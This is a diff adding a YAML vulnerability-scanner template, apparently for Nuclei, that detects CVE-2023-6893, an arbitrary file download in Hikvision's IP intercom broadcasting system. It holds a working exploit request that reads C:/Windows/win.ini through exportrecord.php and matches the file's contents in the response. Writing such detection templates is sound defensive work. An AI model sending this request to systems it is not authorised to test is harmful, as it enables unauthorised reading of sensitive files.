@@ -1,0 +1,29 @@
+id: cve-2023-6893
+info:
+  name: Hikvision IP Network Intercom Broadcasting System exportrecord.php Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve-2023-6893,arbitrary-file-access
+  description: |
+    Hikvision IP Network Intercom Broadcasting System suffers from an arbitrary file download vulnerability in the exportrecord.php script, allowing attackers to access sensitive files from the system.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/php/exportrecord.php?downtype=10&downname=C:/Windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[fonts]"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
